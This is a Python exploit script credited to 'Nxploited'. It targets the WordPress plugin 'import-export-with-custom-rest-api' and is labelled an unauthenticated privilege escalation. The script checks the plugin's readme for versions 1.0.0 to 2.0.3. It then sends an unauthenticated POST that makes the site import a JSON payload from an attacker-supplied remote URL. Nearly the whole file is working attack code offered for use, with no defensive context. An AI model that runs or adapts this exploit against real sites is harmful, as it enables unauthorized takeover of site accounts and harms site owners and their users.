import requests
import argparse
import time
import re
import json
import logging
from urllib.parse import urlparse

# By Khaled_alenazi (Nxploited) 


def setup_logger(level=logging.INFO):
    logger = logging.getLogger("Nxploit")
    if not logger.handlers:
        handler = logging.StreamHandler()
        formatter = logging.Formatter("[%(levelname)s] %(message)s")
        handler.setFormatter(formatter)
        logger.addHandler(handler)
    logger.setLevel(level)
    return logger

logger = setup_logger()

def validate_url(url):
    parsed = urlparse(url)
    if not parsed.scheme.startswith("http"):
        raise ValueError("Invalid URL scheme. Must start with http or https.")
    if not parsed.netloc:
        raise ValueError("Invalid URL: missing domain.")
    return url.rstrip("/")

def version_in_range(version, start, end):
    def normalize(v):
        return list(map(int, v.split(".")))
    return normalize(start) <= normalize(version) <= normalize(end)

def get_plugin_readme_url(base_url):
    return f"{base_url}/wp-content/plugins/import-export-with-custom-rest-api/readme.txt"

def check_plugin_version(session, base_url, sleep_enabled=True):
    readme_url = get_plugin_readme_url(base_url)
    try:
        response = session.get(readme_url, timeout=10)
        if response.status_code == 404:
            logger.warning(f"Plugin version file not found: {readme_url}")
            return False
        match = re.search(r"Stable tag:\s*([\d.]+)", response.text, re.IGNORECASE)
        if not match:
            logger.warning("Plugin version file found, but version tag missing.")
            if sleep_enabled:
                time.sleep(2)
            return True
        version = match.group(1).strip()
        if version_in_range(version, "1.0.0", "2.0.3"):
            logger.info(f"Target appears vulnerable (version: {version}) - exploiting...")
            if sleep_enabled:
                time.sleep(3)
            return True
        else:
            logger.warning(f"Plugin version {version} is outside vulnerable range.")
            return False
    except requests.exceptions.RequestException as e:
        logger.error(f"Requests error during version check: {e}")
        return False
    except Exception as e:
        logger.error(f"Unexpected exception during version check: {e}")
        return False

def fetch_json_payload(session, json_url):
    try:
        response = session.get(json_url, timeout=10)
        response.raise_for_status()
        payload = response.json()
        return payload
    except requests.exceptions.RequestException as e:
        logger.error(f"Requests error retrieving JSON payload: {e}")
        return None
    except json.JSONDecodeError:
        logger.error("Could not decode JSON payload. Check the JSON file format.")
        return None

def Nxploit_exploit(session, base_url, json_url, sleep_enabled=True):
    logger.info(f"Fetching JSON payload from: {json_url}")
    payload = fetch_json_payload(session, json_url)
    if payload is None:
        logger.error("Failed to retrieve or parse JSON payload.")
        return
    logger.info("JSON content loaded successfully:")
    for idx, item in enumerate(payload, 1):
        logger.info(f"    [{idx}] {json.dumps(item, indent=4)}")
    if sleep_enabled:
        time.sleep(3)
    logger.info("Launching exploitation...")
    if sleep_enabled:
        time.sleep(3)
    exploit_url = f"{base_url}/"
    try:
        r = session.post(exploit_url, data={"import_api": json_url}, timeout=10)
        if "error" not in r.text.lower():
            logger.info("Exploit delivered successfully.")
            logger.info("Payload Sent:\n%s", json.dumps(payload, indent=4))
            logger.info("Exploit By : Khaled_alenazi (Nxploited)")
        else:
            logger.warning("Exploit may have failed or returned error page.")
    except requests.exceptions.RequestException as e:
        logger.error(f"Requests error during exploitation: {e}")

def main():
    parser = argparse.ArgumentParser(description="Unauthenticated Privilege Escalation - by Khaled Alenazi (Nxploited)")
    parser.add_argument("-u", "--url", required=True, help="Base URL of WordPress site (e.g., http://target/wp/)")
    parser.add_argument("-json", "--url_json", required=True, help="URL to hosted R.json payload")
    parser.add_argument("--proxy", help="Proxy URL (e.g., http://127.0.0.1:8080)")
    parser.add_argument("--timeout", type=int, default=10, help="HTTP timeout in seconds (default: 10)")
    parser.add_argument("--no-verify", action="store_true", help="Disable SSL certificate verification (NOT recommended!)")
    parser.add_argument("--no-sleep", action="store_true", help="Disable sleep delays for faster execution")
    parser.add_argument("--debug", action="store_true", help="Enable debug output")
    args = parser.parse_args()

    if args.debug:
        logger.setLevel(logging.DEBUG)

    try:
        base_url = validate_url(args.url)
    except ValueError as ve:
        logger.error(str(ve))
        return

    session = requests.Session()
    session.verify = not args.no_verify
    if args.no_verify:
        logger.warning("SSL certificate verification is DISABLED. This is insecure!")
    session.headers.update({
        "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36"
    })
    if args.proxy:
        session.proxies = {"http": args.proxy, "https": args.proxy}
        logger.info(f"Proxy set to: {args.proxy}")

    if check_plugin_version(session, base_url, sleep_enabled=not args.no_sleep):
        Nxploit_exploit(session, base_url, args.url_json, sleep_enabled=not args.no_sleep)

if __name__ == "__main__":
    main()
